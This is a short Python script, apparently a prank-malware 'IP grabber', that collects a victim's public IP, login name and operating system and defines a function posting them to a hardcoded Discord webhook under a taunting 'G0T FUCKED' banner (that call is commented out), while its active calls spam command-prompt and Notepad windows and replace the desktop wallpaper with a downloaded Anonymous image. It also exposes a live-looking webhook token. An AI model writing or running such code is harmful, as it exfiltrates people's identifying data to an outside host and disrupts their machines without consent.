from requests import get,post
import os
import platform
import subprocess
import ctypes


username = os.getlogin()
betriebssystem = platform.system()
ip = get('https://api.ipify.org').text
backgroundImage = r"C:\Users\LeonH\Desktop\Social Media\Profil Bilder\350kViews.png"
WEBHOOK_URL = "https://discord.com/api/webhooks/1450583603644862485/I1HSTg8rSMbeI5nFXxyzBWGqTu_rNoYkaZpFGhT1_9LeBuKF5-JcZ-s7eG6DwzUC3DYf"


def spamOpenEditor():
    datei = open("test.txt","w")
    datei.write("Hello World!")
    subprocess.Popen(["notepad.exe", "/n", "test.txt"])
    subprocess.Popen(["notepad.exe", "/n", "test.txt"])

def changeBackgroundImage():
    try:
        url = "https://images.handelsblatt.com/Pxg-seO35IQc/cover/1595/1196/163/162/0/0/0.5/0.5/hacker-kollektiv-anonymous.jpeg"

        # absoluter Pfad
        pfad = os.path.abspath("background.jpeg")

        r = get(url)

        with open(pfad, "wb") as f:
            f.write(r.content)

        print("Gespeichert unter:", pfad)

        ctypes.windll.user32.SystemParametersInfoW(
            20, 0, pfad, 3
        )
        os.remove(pfad)

    except Exception as e:
        print(f"Error: {e}")


def spamOpenCMD():
    for i in range(10):
        subprocess.Popen("start cmd",shell = True)

def sendWebhook():
    data = {
        "username": "IP-Grabber",
        "embeds": [{
                    "color": 0xFF000,
                    "title": "G0T FUCKED",
                    "description":"Target Infomations",
                    "fields": [
                        {
                            "name": "IP",
                            "value": ip,
                            "inline": True
                        },
                        {
                            "name": "Benutzer",
                            "value": username,
                            "inline": True
                        },
                        {
                            "name": "Operating System",
                            "value": betriebssystem,
                            "inline": True
                        }
                    ],

                    "footer": 
                    {
                        "text": "THIS SERVER WAS FUCKED BY M0#Y \n\n https://discord.gg/ATDec6x6N2",
                        
                    },
                    "image":
                    {
                        "url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQFfSy1tIhLLbN9oJocGdRHDsZYf-1Lmt03OSrwyT5CBg&s=10"
                    }
                }]
    }

    response = post(WEBHOOK_URL,json=data)

#sendWebhook()
spamOpenCMD()
spamOpenEditor()
changeBackgroundImage()